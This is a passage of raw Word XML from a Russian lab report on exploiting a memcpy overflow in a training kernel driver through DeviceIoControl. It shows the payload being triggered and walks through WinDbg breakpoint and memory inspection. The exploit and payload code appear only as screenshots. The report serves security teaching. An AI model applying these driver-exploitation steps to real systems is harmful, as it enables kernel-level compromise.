        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:t>, которые может перехватить отладчик, чтобы подробнее посмотреть, что произошло.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5170E077" w14:textId="77777777" w:rsidR="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D6379"/>
    <w:p w14:paraId="3731D6E7" w14:textId="5A8E07C1" w:rsidR="008D6379" w:rsidRDefault="00524FB3" w:rsidP="008D6379">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00524FB3">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="15CC602A" wp14:editId="5ABF59CE">
            <wp:extent cx="6300470" cy="498475"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="1577258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58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E7F3" w14:textId="46315197" w:rsidR="008D6379" w:rsidRPr="000B6B46" w:rsidRDefault="008D6379" w:rsidP="008D637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16</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Вызов </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001B6552" w:rsidRPr="001B6552">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t xml:space="preserve">в программе </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B6552">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="440627DB" w14:textId="77777777" w:rsidR="000B6B46" w:rsidRPr="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46"/>
    <w:p w14:paraId="505E4596" w14:textId="40BCB0AC" w:rsidR="000B6B46" w:rsidRPr="000B6B46" w:rsidRDefault="000B6B46" w:rsidP="000B6B46">
      <w:r>
        <w:t xml:space="preserve">Чуть позже было выяснено, что для данного варианта лабораторной работы принципиальное значение имеет четвертый параметр функции, так как он задает </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">размер памяти, выделяемый уязвимой функцией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>memcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000B6B46">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Поэтому необходимо заменить ноль на размер передаваемого буфера.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51214233" w14:textId="77777777" w:rsidR="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D6379"/>
    <w:p w14:paraId="7B149FF2" w14:textId="668F7FFE" w:rsidR="008D6379" w:rsidRPr="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D6379">
      <w:r>
        <w:t>При включенном драйвере и запуске написанной программы</w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B6552">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B56646">
        <w:t xml:space="preserve">с единственным аргументом в виде кода операции полезная нагрузка </w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t>не выполняется.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3075C9F7" w14:textId="77777777" w:rsidR="008D6379" w:rsidRPr="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D6379"/>
    <w:p w14:paraId="6B30A04F" w14:textId="5B6CDAE7" w:rsidR="008D6379" w:rsidRDefault="00B40B39" w:rsidP="008D6379">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A16BE95" wp14:editId="5177B167">
            <wp:extent cx="6300470" cy="2185035"/>
            <wp:effectExtent l="0" t="0" r="5080" b="5715"/>
            <wp:docPr id="624197896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7896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8A10" w14:textId="1228555C" w:rsidR="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D637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17</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="008D6379">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Отправка кода управления драйверу</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B864C89" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646"/>
    <w:p w14:paraId="2F000B5A" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00B56646">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D58B8CB" wp14:editId="1396276B">
            <wp:extent cx="6300470" cy="3898900"/>
            <wp:effectExtent l="0" t="0" r="5080" b="6350"/>
            <wp:docPr id="19755590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590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854F" w14:textId="57524608" w:rsidR="00B56646" w:rsidRPr="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B5664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18</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Отображаемый в отладчике текст и заход в функцию с полезной нагрузкой</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1897218A" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646"/>
    <w:p w14:paraId="02DF9E1D" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00B56646">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="210CD902" wp14:editId="73049DF2">
            <wp:extent cx="6300470" cy="2842260"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="17666792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792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D04" w14:textId="398E8521" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B5664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19</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Проверка на наличие второго аргумента и невыполнение перехода к функции с полезной нагрузкой</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B479FE9" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646"/>
    <w:p w14:paraId="7CBAEE0A" w14:textId="5A418E3A" w:rsidR="00B56646" w:rsidRPr="00376AC7" w:rsidRDefault="00B56646" w:rsidP="00B56646">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Если ввести какой-то текст вместе с кодом операции, картина меняется</w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t>, появляются сообщения из полезной нагрузки</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00376AC7">
        <w:t xml:space="preserve"> Также на скриншоте можно увидеть выполнение инструкций </w:t>
      </w:r>
      <w:r w:rsidR="00376AC7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidR="00376AC7" w:rsidRPr="00376AC7">
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r w:rsidR="00376AC7">
        <w:t xml:space="preserve"> – это </w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t xml:space="preserve">точки останова, которые были заданы в программе </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B6552">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001B6552">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA365E6" w14:textId="77777777" w:rsidR="00B56646" w:rsidRDefault="00B56646" w:rsidP="00B56646"/>
    <w:p w14:paraId="2E21DDBE" w14:textId="21DB0146" w:rsidR="00376AC7" w:rsidRDefault="00911A8F" w:rsidP="00376AC7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69CCA3B5" wp14:editId="675676E9">
            <wp:extent cx="6300470" cy="2066925"/>
            <wp:effectExtent l="0" t="0" r="5080" b="9525"/>
            <wp:docPr id="917658581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58581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BF28" w14:textId="5F8E1776" w:rsidR="00B56646" w:rsidRDefault="00376AC7" w:rsidP="00376AC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20</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00376AC7">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Запуск программы </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B6552">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001B6552">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>с двумя аргументами</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD36EBD" w14:textId="77777777" w:rsidR="00376AC7" w:rsidRDefault="00376AC7" w:rsidP="00376AC7"/>
    <w:p w14:paraId="3E8E155D" w14:textId="77777777" w:rsidR="00376AC7" w:rsidRDefault="00376AC7" w:rsidP="00376AC7">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00376AC7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45EE809C" wp14:editId="6F50A365">
            <wp:extent cx="6300470" cy="2879725"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="56825773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5773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783B" w14:textId="4C066A7C" w:rsidR="00376AC7" w:rsidRDefault="00376AC7" w:rsidP="00376AC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21</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Исходный код полезной нагрузки</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A455A1" w14:textId="77777777" w:rsidR="000045C6" w:rsidRDefault="000045C6" w:rsidP="000045C6"/>
    <w:p w14:paraId="1D3E56D8" w14:textId="7DBD0922" w:rsidR="00033F36" w:rsidRDefault="00033F36" w:rsidP="00033F36">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>Отладка внутри драйвера</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1921E7A8" w14:textId="4AD29DF1" w:rsidR="000045C6" w:rsidRPr="00524FB3" w:rsidRDefault="000045C6" w:rsidP="000045C6">
      <w:r>
        <w:t xml:space="preserve">Также можно выполнить отладку </w:t>
      </w:r>
      <w:r w:rsidR="007F15A9">
        <w:t>в драйвере</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FD76F0" w14:textId="3D7B8CCA" w:rsidR="00911A8F" w:rsidRPr="00BF5B87" w:rsidRDefault="003D30A4" w:rsidP="00BF5B87">
      <w:r>
        <w:t>Допустим, необходимо посмотреть, какие аргументы передаются в функцию. Нажав пробел</w:t>
      </w:r>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00911A8F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00911A8F">
        <w:t xml:space="preserve">в </w:t>
      </w:r>
      <w:r w:rsidR="00911A8F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IDA</w:t>
      </w:r>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00911A8F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00911A8F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pro</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, можно найти адрес смещения по драйверу и </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>скопировать данный адрес для команды отладчику</w:t>
      </w:r>
      <w:r w:rsidRPr="003D30A4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>поставить точку останова</w:t>
      </w:r>
      <w:r w:rsidR="00BF5B87">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BF5B87">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>bu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BF5B87">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> MBKS_driver+0x441B9</w:t>
      </w:r>
      <w:r w:rsidR="003844E4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003844E4" w:rsidRPr="003A0D19">
        <w:t xml:space="preserve">(нужно взять из </w:t>
      </w:r>
      <w:r w:rsidR="003844E4" w:rsidRPr="003A0D19">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IDA</w:t>
      </w:r>
      <w:r w:rsidR="003844E4" w:rsidRPr="003A0D19">
        <w:t xml:space="preserve"> правильный адрес, так как там, по всей видимости, реальный адрес функции написан со смещением по базовому адресу)</w:t>
      </w:r>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00BF5B87">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00BF5B87" w:rsidRPr="00BF5B87">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF5B87">
        <w:t>предварительно проверив,</w:t>
      </w:r>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00BF5B87">
        <w:t xml:space="preserve"> что драйвер содержится в списке загруженных модулей с помощью команды </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00911A8F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>lm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00BF5B87">
        <w:t xml:space="preserve"> (иначе будет ошибка)</w:t>
      </w:r>
      <w:r w:rsidR="00911A8F" w:rsidRPr="00911A8F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3523012A" w14:textId="70885973" w:rsidR="00911A8F" w:rsidRPr="00524FB3" w:rsidRDefault="00911A8F" w:rsidP="00911A8F">
      <w:r>
        <w:t xml:space="preserve">Команда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bl</w:t>
      </w:r>
      <w:r w:rsidRPr="003D30A4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>может вывести список всех установленных точек останова.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E38483" w14:textId="394B149E" w:rsidR="00911A8F" w:rsidRDefault="00CA234D" w:rsidP="00911A8F">
      <w:r>
        <w:t xml:space="preserve">В виртуальной памяти можно увидеть, что происходит в памяти. Для просмотра текущей точки останова необходимо вбить полученный после выполнения команды </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> адрес в поиск по памяти и можно будет увидеть байты функции из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IDA</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA234D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pro</w:t>
      </w:r>
      <w:r>
        <w:t>, на который и ставился бряк.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1879DFF0" w14:textId="77777777" w:rsidR="00911A8F" w:rsidRDefault="00911A8F" w:rsidP="00911A8F">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="003D30A4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B9FC0F7" wp14:editId="2ABA866B">
            <wp:extent cx="5791200" cy="3640366"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="122711149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1149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2247" cy="36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0E6C" w14:textId="4B5EB644" w:rsidR="00911A8F" w:rsidRPr="00BF5B87" w:rsidRDefault="00911A8F" w:rsidP="00911A8F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22</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00911A8F">
        <w:t xml:space="preserve"> – Обозначение параметров функции, которые необходимо просмотреть в отладчике</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B22053" w14:textId="77777777" w:rsidR="00911A8F" w:rsidRPr="00BF5B87" w:rsidRDefault="00911A8F" w:rsidP="00911A8F"/>
    <w:p w14:paraId="79041E67" w14:textId="77777777" w:rsidR="00911A8F" w:rsidRDefault="00911A8F" w:rsidP="00911A8F">
      <w:pPr>
        <w:pStyle w:val="ad"/>
        <w:keepNext/>
      </w:pPr>
      <w:r w:rsidRPr="003D30A4">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="667C215D" wp14:editId="4318D1CA">
            <wp:extent cx="5860473" cy="2011769"/>
            <wp:effectExtent l="0" t="0" r="6985" b="7620"/>
            <wp:docPr id="71432460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4604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5851" cy="201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F33" w14:textId="00AAFF80" w:rsidR="00911A8F" w:rsidRDefault="00911A8F" w:rsidP="00911A8F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23</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Поиск</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>адреса</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001C2B50">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>функции</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3D732AFE" w14:textId="7A33555A" w:rsidR="00911A8F" w:rsidRDefault="00CA234D" w:rsidP="00911A8F">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E5E628C" wp14:editId="2D4D8B67">
            <wp:extent cx="6300470" cy="4913630"/>
            <wp:effectExtent l="0" t="0" r="5080" b="1270"/>
            <wp:docPr id="16283721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21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C410" w14:textId="3E1E85B6" w:rsidR="003D30A4" w:rsidRDefault="00911A8F" w:rsidP="00911A8F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24</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Отражение драйвера в списке загруженных модулей после вызова команды </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>lm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, установка точки останова с помощью команды </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CA234D">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> вывод всех точек останова с помощью команды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bl</w:t>
      </w:r>
      <w:r w:rsidR="00CA234D">
        <w:t xml:space="preserve"> и просмотр памяти</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252C3CC2" w14:textId="77777777" w:rsidR="00CA234D" w:rsidRDefault="00CA234D" w:rsidP="00CA234D"/>
    <w:p w14:paraId="49E5C4A6" w14:textId="77777777" w:rsidR="00CA234D" w:rsidRDefault="00CA234D" w:rsidP="00CA234D">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA234D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="26E362AC" wp14:editId="1124668B">
            <wp:extent cx="6300470" cy="1019175"/>
            <wp:effectExtent l="0" t="0" r="5080" b="9525"/>
            <wp:docPr id="1156678103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78103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3CF3" w14:textId="671F050D" w:rsidR="00CA234D" w:rsidRPr="00CA234D" w:rsidRDefault="00CA234D" w:rsidP="00CA234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25</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Совпадение байтов</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA138B3" w14:textId="77777777" w:rsidR="000045C6" w:rsidRPr="00524FB3" w:rsidRDefault="000045C6" w:rsidP="000045C6"/>
    <w:p w14:paraId="36B77061" w14:textId="789CE061" w:rsidR="00CA234D" w:rsidRDefault="00CA234D" w:rsidP="000045C6">
      <w:r>
        <w:t xml:space="preserve">Продолжив отладку и </w:t>
      </w:r>
      <w:r w:rsidR="000D0663">
        <w:t xml:space="preserve">заново запустив программу </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000D0663">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000D0663">
        <w:t xml:space="preserve">, нужно остановиться на поставленном </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000D0663">
        <w:t>брейкпоинте</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000D0663">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBB947D" w14:textId="77777777" w:rsidR="000D0663" w:rsidRDefault="000D0663" w:rsidP="000045C6"/>
    <w:p w14:paraId="586A5BD5" w14:textId="26D12261" w:rsidR="000D0663" w:rsidRDefault="000D0663" w:rsidP="000D0663">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4020A57A" wp14:editId="16FE5737">
            <wp:extent cx="6300470" cy="4928870"/>
            <wp:effectExtent l="0" t="0" r="5080" b="5080"/>
            <wp:docPr id="16475230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2309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7FAC" w14:textId="798B85B2" w:rsidR="000D0663" w:rsidRDefault="000D0663" w:rsidP="000D066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26</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Остановка на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>брейкпоинте</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, который был поставлен ранее с помощью команды </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F177F8B" w14:textId="77777777" w:rsidR="00A64AE6" w:rsidRPr="00A64AE6" w:rsidRDefault="00A64AE6" w:rsidP="00033F36">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F08E5B3" w14:textId="676E95A6" w:rsidR="000D0663" w:rsidRDefault="00A64AE6" w:rsidP="000D0663">
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IDA</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pro</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">было обнаружено, что буфер пушится первее и при том в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ebp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A64AE6">
        <w:t>+0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Ch</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Чтобы найти этот параметр, необходимо перейти по адресу регистра </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">(значение конкретного регистра можно узнать с помощью команды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>esp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> или с помощью специальной вкладки </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WinDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Registers</w:t>
      </w:r>
      <w:r w:rsidR="00033F36">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64AE6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00033F36">
        <w:t>З</w:t>
      </w:r>
      <w:r>
